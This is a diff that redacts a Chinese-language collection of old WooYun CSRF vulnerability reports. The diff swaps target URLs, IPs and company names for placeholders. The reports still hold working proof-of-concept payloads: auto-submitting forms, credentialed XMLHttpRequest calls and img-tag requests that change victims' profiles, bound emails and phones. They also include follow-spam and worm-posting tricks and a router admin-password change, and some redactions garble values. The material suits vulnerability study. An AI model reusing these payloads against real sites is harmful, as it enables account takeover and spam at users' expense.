@@ -20,12 +20,12 @@
 **标题**: 格瓦拉生活网多处CSRF可刷粉，发影评及回复
 **原始类型**: 漏洞类型：CSRF
 **URL示例**: 
-  - `http://www.gewara.com/activity/ajax/sns/replyComment.xhtml`
-  - `http://www.gewara.com/activity/community/ajax/addAttention.xhtml`
+  - `https://example.com/[已脱敏]`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
 **Payload片段**:
   ```
-  orm action="http://www.gewara.com/activity/ajax/sns/
+  orm action="https://example.com/[已脱敏]
   ```
   ```
   orm><script>document.forms[0].submit();</script></bo
@@ -39,7 +39,7 @@
 **原始类型**: 漏洞类型：CSRF
 **参数**: `url, desc, callback, get_recent_photos, _`
 **URL示例**: 
-  - `http://luxury.sohu.com/20140218/n395206851.shtml可自定义图片地址、描述等如访问http://pp.sohu.comhttps://wooyun-img....`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
 
 ### 案例 3: wooyun-2014-051292
@@ -63,12 +63,12 @@
 
 #### wooyun-2015-0135307
 **极客学院某处CSRF**
-- Payload: `orm action="http://www.jikexueyuan.com/member/change`
+- Payload: `orm action="https://example.com/[已脱敏]`
 
 #### wooyun-2015-0117987
 **爱丽网漏洞小礼包**
 - 参数: `m, a, c`
-- Payload: `orm action="http://member.aili.com/?c=main&m=ajax&a=`
+- Payload: `orm action="https://example.com/[已脱敏]`
 
 ---
 
@@ -87,7 +87,7 @@
 ### 典型案例
 
 #### wooyun-2015-0122514
-**从一个小xss到csrf到腾讯空间被刷爆了(一个业务蠕虫的诞生过程/测试已停)**
+**从一个小xss到csrf到某互联网公司空间被刷爆了(一个业务蠕虫的诞生过程/测试已停)**
 - 参数: `s_url, target, appid, hln_css, style`
 - Payload: `;data=eyJpZCI6Im1hcHNJZF81NThhN`
 
@@ -103,7 +103,7 @@
 **西子论坛CSRF刷粉丝漏洞**
 - 参数: `r, uid, _, touid, callback`
 - 洞察:
-  - 点击关注抓包分析url：http://my.xizi.com/index.php?r=user/addfollow&callback=jQuery17209595374003984034_1383139467140&follow=1&uid=关注者ID&touid=被关注者ID&_=1383139469893去掉参数&uid=可形成CSRF
+  - 点击关注抓包分析url：https://example.com/[已脱敏]
 
 #### wooyun-2015-0161029
 **米尔商城CSRF修改他人信息**
@@ -132,7 +132,7 @@
 **穷游网CSRF刷粉丝漏洞。**
 
 #### wooyun-2012-08613
-**网易某处CSRF漏洞**
+**某互联网公司某处CSRF漏洞**
 - 参数: `imageUrl, special_site, modulefrom, keyfrom, method`
 ---
 ### [wooyun-2012-08606] 爱拍某处CSRF漏洞
@@ -149,7 +149,7 @@
 
 **详情**: 在接受GET的信息的时候，未对GET来路(Referer)进行验证，同时也没有在GET的信息中加token验证信息的正确性，导致漏洞产生。应用场景，在某些地方，例如YY、论坛、评论，发出这个地址，或者用IMG标签引用这个地址，然后你的粉丝就倍增了~~
 
-**POC**: http://www.aipai.com/app/www/apps/subscribe.php?bid=[被关注的ID]&callback%09=scribeSuccess_new&action=addSubscribe
+**POC**: https://example.com/[已脱敏]]&callback%09=scribeSuccess_new&action=addSubscribe
 
 **绕过**: 直接利用
 
@@ -171,7 +171,7 @@
 
 **详情**: 
 
-**POC**: <html><head><title>poc2.html</title></head><body><form action="http://my.wuzhe.com/wuzhe/experience" method="post"><input type="hidden" name="startdate" value="2015-06-06"><input type="hidden" name="enddate" value="2015-07-07"><input type="hidden" name="companyname" value="%E5%B9%BF%E4%B8%9C%E5%86%B
+**POC**: <html><head><title>poc2.html</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="startdate" value="2015-06-06"><input type="hidden" name="enddate" value="2015-07-07"><input type="hidden" name="companyname" value="%E5%B9%BF%E4%B8%9C%E5%86%B
 
 **绕过**: 直接利用
 
@@ -213,7 +213,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 暗恋：http://huodong.renren.com/biaobai/addBiaoBai?content=表白内容&beiId=表白对象ID号&beiName=表白对象名&userType=0http://huodong.renren.com/biaobai/addPublic?beiId=表白对象ID发状态：http://huodong.renren.com/biaobai/addDoing?c=表白内容&type=2通过发状态可蠕虫似地传播网址
+**详情**: 暗恋：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -237,7 +237,7 @@
 
 **详情**: 
 
-**POC**: 首先我们先让用户中招绑定上我的QQ邮箱，我写了一个SCRF。代码如下：<html><head><title>scr poc</title></head><body><form action="http://i.beibei.com/security/email_binding.html" method="post"><input type="hidden" name="hxcsrf" value="47c1bdc32e559d7774e220a3c2427d43"><input type="hidden" name="email" value="953837476%40qq.com"></fo
+**POC**: 首先我们先让用户中招绑定上我的某互联网公司邮箱，我写了一个SCRF。代码如下：<html><head><title>scr poc</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="hxcsrf" value="47c1bdc32e559d7774e220a3c2427d43"><input type="hidden" name="email" value="953837476%40某互联网公司.com"></fo
 
 **绕过**: 直接利用
 
@@ -257,13 +257,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题1：账号注入后，绑定OAuth时，无token验证，存在csrf。而且此处应加入state参数。相关问题修复看http://drops.wooyun.org/papers/598 的 “针对应用方csrf劫持第三方账号” 章节。问题2：手机解除绑定操作可以被暴力破解，添加验证码解决。
+**详情**: 问题1：账号注入后，绑定OAuth时，无token验证，存在csrf。而且此处应加入state参数。相关问题修复看https://example.com/[已脱敏] 的 “针对应用方csrf劫持第三方账号” 章节。问题2：手机解除绑定操作可以被暴力破解，添加验证码解决。
 
 **POC**: 问题1证明：无token或者state保护，存在csrf。问题2证明：解绑定手机无验证码判断，存在暴力破解问题
 
 **绕过**: 直接利用
 
-**修复**: 漏洞1：相关问题修复看http://drops.wooyun.org/papers/598 的 “针对应用方csrf劫持第三方账号” 章节。具体修复参考漏洞2：添加提交code时的验证码检查功能
+**修复**: 漏洞1：相关问题修复看https://example.com/[已脱敏] 的 “针对应用方csrf劫持第三方账号” 章节。具体修复参考漏洞2：添加提交code时的验证码检查功能
 ---
 
 ---
@@ -289,8 +289,8 @@
 ---
 
 ---
-### [wooyun-2016-0180311] 新浪论坛CSRF打包及危害说明（多个子论坛通用）
-**厂商**: 新浪 | **年份**: 2016 | **类型**: CSRF
+### [wooyun-2016-0180311] 某社交平台论坛CSRF打包及危害说明（多个子论坛通用）
+**厂商**: 某社交平台 | **年份**: 2016 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入
 
@@ -301,9 +301,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 此漏洞涉及到的新浪子论坛包括但不限于以下站点星座 http://club.astro.sina.com.cn/     b4201dfd数码 http://club.tech.sina.com.cn/      b4201dfd百味 http://club.news.sina.com.cn/      b4201dfd生活 http://club.life.sina.com.cn/      b4201dfd女性 http://club.eladies.sina.com.cn/   4788b761历史 http://club.history.sina.com.cn/   b4201dfd军事 http://club.mil.news.sina.com.cn/  b4201dfd体育 http://club.baby.sina.com.cn/      b4201dfd亲子 http://
+**详情**: 此漏洞涉及到的某社交平台子论坛包括但不限于以下站点星座 https://example.com/[已脱敏]     b4201dfd数码 https://example.com/[已脱敏]      b4201dfd百味 https://example.com/[已脱敏]      b4201dfd生活 https://example.com/[已脱敏]      b4201dfd女性 https://example.com/[已脱敏]   4788b761历史 https://example.com/[已脱敏]   b4201dfd军事 https://example.com/[已脱敏]  b4201dfd体育 https://example.com/[已脱敏]      b4201dfd亲子 http://
 
-**POC**: 以亲子论坛为例，时间有限只测试了四个位置，估计整个论坛都没有做csrf的防护，其他重要位置还请自行检测^_^1 修改用户信息<form action="http://club.baby.sina.com.cn/memcp.php?action=profile&typeid=2" method="post"><input type="hidden" name="formhash" value="aec0506d" /><input type="hidden" name="nicknamenew" value="GAY21888" /><input type="hidden" name="gend
+**POC**: 以亲子论坛为例，时间有限只测试了四个位置，估计整个论坛都没有做csrf的防护，其他重要位置还请自行检测^_^1 修改用户信息<form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="formhash" value="aec0506d" /><input type="hidden" name="nicknamenew" value="GAY21888" /><input type="hidden" name="gend
 
 **绕过**: 直接利用
 
@@ -311,8 +311,8 @@
 ---
 
 ---
-### [wooyun-2014-080964] 新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）
-**厂商**: 新浪微博 | **年份**: 2014 | **类型**: CSRF
+### [wooyun-2014-080964] 某社交平台某社交平台某处小功能存在CSRF漏洞（可修改用户某社交平台某元素）
+**厂商**: 某社交平台某社交平台 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -323,7 +323,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新版微博出了一个小功能（类似QQ空间一样），就是可以设置背景音乐。通过抓包后得知背景音乐某首歌的URL为：http://ting.weibo.com/music/weidanmobile/add?sid=2858931&gid=defaultid&key=f10aba96cdedec5df88cdaf6371d9ebf&token=5e04af60a57bc0b130ac9550f879b86e&plat=pc这里sid为这首歌的ID 后面token我理解为都是这首歌的。。直接点击上面的URL就可以看到在你个人页面左边有个背景音乐了：
+**详情**: 新版某社交平台出了一个小功能（类似某互联网公司空间一样），就是可以设置背景音乐。通过抓包后得知背景音乐某首歌的URL为：https://example.com/[已脱敏] 后面token我理解为都是这首歌的。。直接点击上面的URL就可以看到在你个人页面左边有个背景音乐了：
 
 **POC**: (见原文)
 
@@ -333,8 +333,8 @@
 ---
 
 ---
-### [wooyun-2010-0640] 网易微博CSRF
-**厂商**: 网易 | **年份**: 2010 | **类型**: CSRF
+### [wooyun-2010-0640] 某互联网公司某社交平台CSRF
+**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -345,9 +345,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 恶意攻击者可构造恶意表单，并骗取受害者点击，当受害者点击链接时，会以受害者的名义产生一条微博信息，此方法可产生蠕虫，非常严重。
+**详情**: 恶意攻击者可构造恶意表单，并骗取受害者点击，当受害者点击链接时，会以受害者的名义产生一条某社交平台信息，此方法可产生蠕虫，非常严重。
 
-**POC**: 测试方法：1、将下列表单存储成index.html,放在本地目录下，将183.174.39.46换成你自己的ip。<form name="CSRF" method="POST" name="form0" action="http://t.163.com:80/statuses/update.do"><input type="hidden" name="status" value="http://183.174.39.46/index.html"/><input type="hidden" name="in_reply_to_status_id" value="sendinfo"/><input
+**POC**: 测试方法：1、将下列表单存储成index.html,放在本地目录下，将183.174.39.46换成你自己的ip。<form name="CSRF" method="POST" name="form0" action="https://example.com/[已脱敏]"><input type="hidden" name="status" value="http://[IP已脱敏] type="hidden" name="in_reply_to_status_id" value="sendinfo"/><input
 
 **绕过**: 直接利用
 
@@ -369,7 +369,7 @@
 
 **详情**: 
 
-**POC**: 从上图可看到，他关注是通过/v2/follow/addFollow.do这个文件下面的，objectId="+关注ID"可以看到我现在是处于还没关注状态。现在我们来构造一下一个地址吧url：http://register.zhenai.com/v2/follow/addFollow.do?objectId=+关注ID如图我们可以看到返回已关注，下面我们刷新一下他的资料看看。可以看到关注成功。我们可以利用这个rul去向别人发送，一点击他就触发了。
+**POC**: 从上图可看到，他关注是通过/v2/follow/addFollow.do这个文件下面的，objectId="+关注ID"可以看到我现在是处于还没关注状态。现在我们来构造一下一个地址吧url：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -377,8 +377,8 @@
 ---
 
 ---
-### [wooyun-2015-0158002] 中国移动山西某分站彩铃服务任意号码注册(可直接开通业务)
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0158002] 某运营商山西某分站彩铃服务任意号码注册(可直接开通业务)
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -411,18 +411,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 知乎的绑定微博登陆的请求为http://www.zhihu.com/oauth/redirect/bind/sina?next=/oauth/callback此请求并未做csrf防护，攻击者可以在第三方网页中伪造此请求新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过知乎，那么就会自动绑定成功所以我们可以找一个新浪微博登陆的csrf漏洞，让用户自动登陆攻击者的微博然后再让用户访问绑定请求，这样就完成了对攻击者微博的绑定。攻击者使用微博登陆就可以进入用户的知乎账号
+**详情**: 知乎的绑定某社交平台登陆的请求为https://example.com/[已脱敏]
 
-**POC**: 已录视频http://v.youku.com/v_show/id_XMTQxNzEzNjgxNg==.html密码：198625
+**POC**: 已录视频https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 增加csrf防护微博绑定强制使用微博用户名密码登陆
+**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
 ---
 
 ---
-### [wooyun-2012-08531] 新浪微博某处CSRF漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-08531] 某社交平台某社交平台某处CSRF漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -435,7 +435,7 @@
 
 **详情**: GET模式，所以自评15在接受GET的信息的时候，未对GET来路(Referer)进行验证，同时也没有在GET的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 漏洞地址：http://event.games.sina.com.cn/cooperation/9yin/index.php （GET模式）<html><body><form id="imlonghao" name="imlonghao" action="http://event.games.sina.com.cn/cooperation/9yin/index.php" method="get"><input type="text" name="do" value="updateweibo" /><input type="text" name="content" value="XXXXX" /
+**POC**: 漏洞地址：https://example.com/[已脱敏] （GET模式）<html><body><form id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="get"><input type="text" name="do" value="updateweibo" /><input type="text" name="content" value="XXXXX" /
 
 **绕过**: 直接利用
 
@@ -477,7 +477,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登录账户A。，修改其收货地址，并抓包查看其收货地址,修改成功;可以看到，修改收货请求为post请求，同时，一切参数均是可预测（AddressId、UserId均是以1自然升序，完全可遍历猜测！）。猜测存在csrf，便去试一把。。。构造csrfxiangshe.htmlxmlhttp.open("POST", "http://www.xiangshe.com/my/doEditaddress.do", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("MAddressInfo.AddressId=92589&MAddressInfo.UserId=150936&MAddressInfo.T
+**详情**: 登录账户A。，修改其收货地址，并抓包查看其收货地址,修改成功;可以看到，修改收货请求为post请求，同时，一切参数均是可预测（AddressId、UserId均是以1自然升序，完全可遍历猜测！）。猜测存在csrf，便去试一把。。。构造csrfxiangshe.htmlxmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("MAddressInfo.AddressId=92589&MAddressInfo.UserId=150936&MAddressInfo.T
 
 **POC**: 同上
 
@@ -499,7 +499,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 修改个人信息，抓包查看：可以看到无不可预测参数，故伪造恶意链接，主要代码：xmlhttp.open("POST", "http://guang.com/account/doBasic", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickname=woo123232&sex=male&year=1982&month=1&day=1&province=1&city=1&blog=http%3A%2F%2F11aaaa.com&intro=xsacd32fdsgfsd365");访问链接成功，信息已被修改。修改前后效果对比图：
+**详情**: 修改个人信息，抓包查看：可以看到无不可预测参数，故伪造恶意链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickname=woo123232&sex=male&year=1982&month=1&day=1&province=1&city=1&blog=http%3A%2F%2F11aaaa.com&intro=xsacd32fdsgfsd365");访问链接成功，信息已被修改。修改前后效果对比图：
 
 **POC**: 同上
 
@@ -521,7 +521,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 饭否的手机版和IPHONE版均可在PC上访问，发帖时虽然有token，但经测试，是个摆设，reffer虽有限制，但可以通过http://XXXXX.com/http://fanfou.com/这样的形式绕过
+**详情**: 饭否的手机版和IPHONE版均可在PC上访问，发帖时虽然有token，但经测试，是个摆设，reffer虽有限制，但可以通过https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -545,7 +545,7 @@
 
 **详情**: 虽然前端页面做了 游客 只能提交一次的限制，但是直接以URL访问则没有限制，只要按着F5不放，一会就能上百上千。。。。而且dede的官方也木有做这方面的限制。。。你懂的
 
-**POC**: http://www.dedecms.com/plus/feedback.php?aid=1102&action=bad&fid=1102http://www.dedecms.com/news/2011/1201/1102.html
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -565,7 +565,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 修改用户基本资料，抓包：修改成功：伪造恶意链接，可以看到修改用户资料的请求为get请求，故浏览器可直接访问该链接（此url地址由上面修改资料的请求得来）：http://www.jiumei.com/account/user_updateUser.dhtml?m=&name=%25u6211%25u6211%25u6211&homeAddress=%25u5317%25u4EAC%25u4E1C%25u57CE%25u533A&email=test_cumt%40126.com&sex=1&provincial=001002&city=001002001&county=null&zipcode=111111&mobile=13611111111&homePhone=5632365刷新个人资料验证已被成功修改
+**详情**: 修改用户基本资料，抓包：修改成功：伪造恶意链接，可以看到修改用户资料的请求为get请求，故浏览器可直接访问该链接（此url地址由上面修改资料的请求得来）：https://example.com/[已脱敏]
 
 **POC**: 已证明
 
@@ -587,7 +587,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜狐视频可以设置搜狐通行证手机号绑定。http://my.tv.sohu.com/user/setting/mobile.do输入手机号后，向该手机号发送验证码。填入动态验证码后，会ajax绑定手机号和验证码是否正确对应GET /user/a/mobile/checkCode.do?m=13811110000&mcode=1234&t=3 HTTP/1.1ajax验证通过后，点击绑定。提交绑定请求。绑定请求中会重新提交手机号码和验证码。而服务器获取动态验证码时并未将此手机号、验证码、账号三者进行关联，导致只要验证码与手机号匹配，此手机号可以与别的账号进行绑定。并且最终绑定链接没有CSRF防护。http://my.tv.sohu.com/user/a/mobile/bindMobile.do?m=18311110000&code=6567将最终的绑定链接发给妹子。成功绑定。绑定成功后，可以通
+**详情**: 搜狐视频可以设置搜狐通行证手机号绑定。https://example.com/[已脱敏] /user/a/mobile/checkCode.do?m=13811110000&mcode=1234&t=3 HTTP/1.1ajax验证通过后，点击绑定。提交绑定请求。绑定请求中会重新提交手机号码和验证码。而服务器获取动态验证码时并未将此手机号、验证码、账号三者进行关联，导致只要验证码与手机号匹配，此手机号可以与别的账号进行绑定。并且最终绑定链接没有CSRF防护。https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -609,7 +609,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://show.aili.com/index.php?m=content&c=goods&a=goodsShow&gid=5071273无限评论
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 任意关注csrf抓包数据：POST /index.php?m=content&c=goods&a=addAttention HTTP/1.1Host: show.aili.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:23.0) Gecko/20100101 Firefox/23.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urle
 
@@ -631,7 +631,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://jiaoyou.58.com/user/follow?uid=10475096157702&d=1383231187246名片墙关注好友关注：http://jiaoyou.58.com/photo/ajaxdeletephoto?id=22099841704474
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 没什么好证明的，一个美女图片加一个img伪装的csrf，还是get，还是你们网站的域名开头，例如： 这是我妹妹XXX，挺漂亮的。
 
@@ -655,7 +655,7 @@
 
 **详情**: 
 
-**POC**: 前提 该频道未设置频道密码sid=频道IDnewPassword=要设的频道密码http://gh.yy.duowan.com/channel/operationPw/operation!modifyPassword.action?sid=123456&newPassword=123456
+**POC**: 前提 该频道未设置频道密码sid=频道IDnewPassword=要设的频道密码https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -675,7 +675,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://github.com/zry656565/foundation/blob/4c2d071896857c67801772c73900333d3d2ee3b7/alipay/send_email_test.php登陆成功
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -697,7 +697,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 绑定邮箱处没有tokenPOC<html><body><form action="http://yun.lu/user/securityAuth/sendBindEmail" method="POST"><input type="hidden" name="email" value="wooyun1&#64;163&#46;com" /><input type="submit" value="Submit request" /></form></body></html>
+**详情**: 绑定邮箱处没有tokenPOC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="email" value="wooyun1&#64;163&#46;com" /><input type="submit" value="Submit request" /></form></body></html>
 
 **POC**: (见原文)
 
@@ -721,7 +721,7 @@
 
 **详情**: 
 
-**POC**: 修改资料保存处抓包，请求数据我就不贴上了，是一个get提交的，直接构造一个URL就行了，也可以构造一个表单，我们就构造一个URL。我构造的URL如下：http://my.fanhuan.com/ajax/UpdateUserDetail/?Email=&Mobile=undefined&QQ=123456789&Sex=%E7%94%B7&RealName=&AccountName=&AccountId=&checkcode=&type=detail&Username=hackers&Birthday=2014-5-20&icon=http%3A%2F%2Fi.fanhuan.org%2Fim
+**POC**: 修改资料保存处抓包，请求数据我就不贴上了，是一个get提交的，直接构造一个URL就行了，也可以构造一个表单，我们就构造一个URL。我构造的URL如下：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -741,7 +741,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://appblog.cxt8.com/agagakj/Comment/CommentAdd?parentid=0&pindex=1&content=123456&commenttype=101&is_desc=true&keyid=1&callback=jQuery16208815743161222577_1400028543820&_=1400028988970留言抓包get请求链接<img alt="" _xhe_src="http://appblog.cxt8.com/agagakj/Comment/CommentAdd?parentid=…ack=jQuery16208815743161222577_1400028543820&_=1400028988970" src="http://appblog.cxt8.com/agagakj/Comment/CommentAdd?
+**详情**: https://example.com/[已脱敏] alt="" _xhe_src="https://example.com/[已脱敏]" src="https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -763,7 +763,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天调试了一下斗鱼整体界面..发现房间的关注按钮有点不科学, 居然是GET方式增加关注随意找了一个房间(房间ID 253763)是一个妹子哟~构造成<img src="http://www.douyutv.com/room/follow/add/253763" />接下来该怎么利用?找一个观众多的主播, 社工下他的号在编辑器插入HTML代码<img src="http://www.douyutv.com/room/follow/add/253763" />即可
+**详情**: 今天调试了一下斗鱼整体界面..发现房间的关注按钮有点不科学, 居然是GET方式增加关注随意找了一个房间(房间ID 253763)是一个妹子哟~构造成<img src="https://example.com/[已脱敏]" />接下来该怎么利用?找一个观众多的主播, 社工下他的号在编辑器插入HTML代码<img src="https://example.com/[已脱敏]" />即可
 
 **POC**: 某过万主播观众数往直播详情插的img下面是女主播的观众数增加速度0 0开始前:发此漏洞的时候
 
@@ -773,8 +773,8 @@
 ---
 
 ---
-### [wooyun-2013-019188] 新浪CSRF刷粉丝漏洞
-**厂商**: 新浪 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-019188] 某社交平台CSRF刷粉丝漏洞
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -785,7 +785,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 两个接口都存在问题http://data.weibo.com/top/ajax/friendships?user_id=11223344&att_location=profile_userprofile&action=create&_t=0http://data.weibo.com/report/ajax/friendships?user_id=11223344&att_location=profile_userprofile&action=create&_t=0虽然校验了referer， 但是，本来是POST的接口，却可以响应GET请求刚好data.weibo.com的首页就有微博， 只要在这里评论， 或者发新微博， 别人点击即可触发同时还可以删除粉丝， 链接里面action=create改成action=destory即可
+**详情**: 两个接口都存在问题https://example.com/[已脱敏] 但是，本来是POST的接口，却可以响应GET请求刚好data.weibo.com的首页就有某社交平台， 只要在这里评论， 或者发新某社交平台， 别人点击即可触发同时还可以删除粉丝， 链接里面action=create改成action=destory即可
 
 **POC**: (见原文)
 
@@ -795,7 +795,7 @@
 ---
 
 ---
-### [wooyun-2013-038379] easytalkCSRF可蠕虫发微博
+### [wooyun-2013-038379] easytalkCSRF可蠕虫发某社交平台
 **厂商**: nextsns.com | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
@@ -807,7 +807,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: easytalkCSRF可蠕虫发微博可用于各个方面，例如广告传销，一发不可收拾
+**详情**: easytalkCSRF可蠕虫发某社交平台可用于各个方面，例如广告传销，一发不可收拾
 
 **POC**: 抓包得：POST /?m=space&a=sendmsg HTTP/1.1Host: t.nextsns.comConnection: Keep-AliveContent-Length: 51Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; SE 2.X MetaSr 1.0)accept-language: zh-cncontent-type: applicati
 
@@ -831,7 +831,7 @@
 
 **详情**: 搜狐留言功能验证不严，虽然设置了postkey但并未生效（图中cookie暂时删除，发包时还原了。）删除key继续发包，然后。。
 
-**POC**: POC：<html><body><form action="http://club.sohu.com/message/send_sig_message_tj.php" method="POST"><input type="hidden" name="back&#95;encode" value="manage&#95;message&#46;php&#63;states&#61;0&amp;offset&#61;0" /><input type="hidden" name="receiveCN" value="baobaosb999" /><input type="hidden" name="
+**POC**: POC：<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="back&#95;encode" value="manage&#95;message&#46;php&#63;states&#61;0&amp;offset&#61;0" /><input type="hidden" name="receiveCN" value="baobaosb999" /><input type="hidden" name="
 
 **绕过**: 直接利用
 
@@ -851,9 +851,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://game.open.uc.cn/无token，劫持用户修改邮箱
+**详情**: https://example.com/[已脱敏]
 
-**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=gb2312"></head><body><form id="letv" name="letv" action="https://cp.open.uc.cn/users/sendUpdateEmail" method="POST"><input type="text" name="newEmail" value="1234567@qq.com" /><input type="text" name="_respType" value="json" /><
+**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=gb2312"></head><body><form id="letv" name="letv" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="newEmail" value="1234567@某互联网公司.com" /><input type="text" name="_respType" value="json" /><
 
 **绕过**: 直接利用
 
@@ -875,7 +875,7 @@
 
 **详情**: 配合前两个CSRF使用，效果更加，哈哈。WooYun: 搜狐某处CSRF漏洞WooYun: 搜狐某处CSRF漏洞在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 漏洞地址：http://t.sohu.com/follow/addfollows<html><body><form id="imlonghao" name="imlonghao" action="http://t.sohu.com/follow/addfollows" method="post"><input type="text" name="act" value="follow" /><input type="text" name="friendids" value="23117291" /><input type="text" name="uid" value="23117291" />
+**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="act" value="follow" /><input type="text" name="friendids" value="23117291" /><input type="text" name="uid" value="23117291" />
 
 **绕过**: 直接利用
 
@@ -919,7 +919,7 @@
 
 **详情**: Linksys EA2700路由器，在同一网络上的人都可以用远程管理改变路由器的密码。这可以从互联网上访问此路由器的网络。CSRF攻击！只需发送POST请求到apply.cgi，将开启远程管理和更改管理员密码。
 
-**POC**: POST /apply.cgi HTTP/1.1Host: 192.168.1.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveCont
+**POC**: POST /apply.cgi HTTP/1.1Host: [IP已脱敏]User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveCont
 
 **绕过**: 直接利用
 
@@ -941,7 +941,7 @@
 
 **详情**: 
 
-**POC**: 废话不多说，直接上图说重点。在点击关注处抓包。请求的数据我就不再贴出来了。下面我贴一下这个漏洞的CSRF POC的代码。<html><head><title>CSRF POC</title></head><body><form action="http://www.youyuan.com/json/user/attention.html" method="post"><input type="hidden" name="userId" value="255121945"><input type="hidden" name="typeId" value="1"></form><script>do
+**POC**: 废话不多说，直接上图说重点。在点击关注处抓包。请求的数据我就不再贴出来了。下面我贴一下这个漏洞的CSRF POC的代码。<html><head><title>CSRF POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="userId" value="255121945"><input type="hidden" name="typeId" value="1"></form><script>do
 
 **绕过**: 直接利用
 
@@ -949,8 +949,8 @@
 ---
 
 ---
